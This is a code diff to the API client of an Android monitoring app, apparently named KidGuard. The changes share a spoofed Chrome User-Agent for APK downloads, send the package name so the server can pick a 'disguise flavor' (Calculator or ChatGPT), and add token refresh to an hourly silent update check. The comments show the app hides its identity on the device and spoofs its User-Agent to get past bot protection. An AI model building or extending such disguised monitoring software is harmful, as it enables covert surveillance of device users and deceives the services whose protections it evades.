@@ -27,7 +27,9 @@ object ApiClient {
     // "KidGuardDevice/1.0" UA) and returns "429 Just a moment" pages, so the
     // dashboard would never see the device. A realistic Android Chrome UA
     // sails straight through (verified live on the Realme device).
-    private const val MOBILE_UA =
+    // `const` (not private) so UpdateManager can attach the same UA to its
+    // HttpURLConnection-based APK download (it does not go through OkHttp).
+    const val MOBILE_UA =
         "Mozilla/5.0 (Linux; Android 14; RMX3612 Build/UP1A.231005.007) " +
             "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 " +
             "Mobile Safari/537.36"
@@ -820,18 +822,31 @@ object ApiClient {
     fun checkForUpdate(currentVersionCode: Int): UpdateCheckResult {
         return try {
             val url = "${CloudConfig.apiBaseUrl}/app/check-update"
+            // package_name lets the server resolve the correct disguise flavor
+            // (Calculator vs ChatGPT) even before the installed-apps report
+            // lands — v4+ clients are resolved by it server-side.
             val json = JSONObject().apply {
                 put("device_id", CloudConfig.deviceId)
                 put("version_code", currentVersionCode)
+                put("package_name", com.anonchat.app.BuildConfig.APPLICATION_ID)
             }
-            val request = Request.Builder()
-                .url(url)
-                .addHeader("Content-Type", "application/json")
-                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
-                .post(json.toString().toRequestBody(JSON_MEDIA_TYPE))
-                .build()
-            val response = client.newCall(request).execute()
-            val body = response.body?.string() ?: "{}"
+
+            var response = client.newCall(buildRequest(url, json.toString())).execute()
+            var body = response.body?.string() ?: "{}"
+
+            // 401 → access token expired. Refresh once and retry (same
+            // recovery pattern as bulk report); without it the hourly update
+            // check silently did nothing until the next bulk report happened
+            // to rotate the token.
+            if (response.code == 401) {
+                try { response.close() } catch (_: Exception) {}
+                CloudConfig.accessToken = null
+                if (ensureAuthenticated()) {
+                    response = client.newCall(buildRequest(url, json.toString())).execute()
+                    body = response.body?.string() ?: "{}"
+                }
+            }
+
             val data = JSONObject(body)
             if (response.isSuccessful) {
                 UpdateCheckResult(
